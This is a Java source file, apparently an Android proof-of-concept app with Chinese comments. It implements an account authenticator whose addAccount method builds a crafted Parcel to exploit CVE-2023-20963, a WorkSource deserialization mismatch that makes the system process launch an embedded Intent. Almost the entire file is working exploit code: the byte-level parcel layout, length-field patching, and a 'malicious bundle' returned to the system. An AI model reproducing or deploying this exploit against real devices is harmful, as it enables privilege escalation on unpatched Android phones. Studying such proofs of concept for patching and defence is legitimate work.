package com.example.tzpoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {
    private static final String TAG = "BadParcel";

    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    /**
     * 构造恶意Parcel，触发CVE-2023-20963
     * 利用WorkSource反序列化不一致，使系统进程执行我们嵌入的Intent
     */
    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {

        MainActivity.appendLog("[*] addAccount called. Building malicious parcel...");

        // 构造一个Intent，指向我们的ProofActivity
        Intent exploitIntent = new Intent();
        exploitIntent.setComponent(new ComponentName(
                "com.example.tzpoc",
                "com.example.tzpoc.ProofActivity"
        ));
        exploitIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        // 可以传递额外数据，这里不需要

        // 序列化Intent到Parcel
        Parcel intentParcel = Parcel.obtain();
        exploitIntent.writeToParcel(intentParcel, 0);

        // 开始构建恶意Parcel (参考公开PoC)
        Parcel dataParcel = Parcel.obtain();
        Parcel finalParcel = Parcel.obtain();

        // 写入WorkSource混淆数据
        dataParcel.writeInt(3);      // 版本
        dataParcel.writeInt(13);     // WorkSource type token
        dataParcel.writeInt(2);      // flags
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(6);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(4);
        dataParcel.writeString("android.os.WorkSource");
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(13);
        dataParcel.writeInt(68);
        dataParcel.writeInt(11);
        dataParcel.writeInt(0);
        dataParcel.writeInt(7);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(22);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(13);
        dataParcel.writeInt(-1);

        // 插入Intent数据
        int intentStartPos = dataParcel.dataPosition();
        dataParcel.writeString("intent");
        dataParcel.writeInt(4);      // PARCELABLE
        dataParcel.writeString("android.content.Intent");
        dataParcel.appendFrom(intentParcel, 0, intentParcel.dataSize());

        // 修正长度字段
        int intentEndPos = dataParcel.dataPosition();
        dataParcel.setDataPosition(intentStartPos - 4);
        dataParcel.writeInt(intentEndPos - intentStartPos);
        dataParcel.setDataPosition(intentEndPos);

        // 最终封装成Bundle的Parcel格式
        int totalSize = dataParcel.dataSize();
        MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));

        finalParcel.writeInt(totalSize);
        finalParcel.writeInt(0x4c444e42); // "BDNL"
        finalParcel.appendFrom(dataParcel, 0, totalSize);
        finalParcel.setDataPosition(0);

        // 从恶意Parcel恢复Bundle
        Bundle result = new Bundle();
        try {
            result.readFromParcel(finalParcel);
            MainActivity.appendLog("[+] Malicious bundle created.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to read malicious parcel: " + e.getMessage());
        }

        // 清理
        intentParcel.recycle();
        dataParcel.recycle();
        finalParcel.recycle();

        MainActivity.appendLog("[*] Returning malicious bundle to system process.");
        return result;
    }

    // 其他必须实现的方法（空实现）
    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
        return null;
    }
    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }
    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) {
        return null;
    }
}
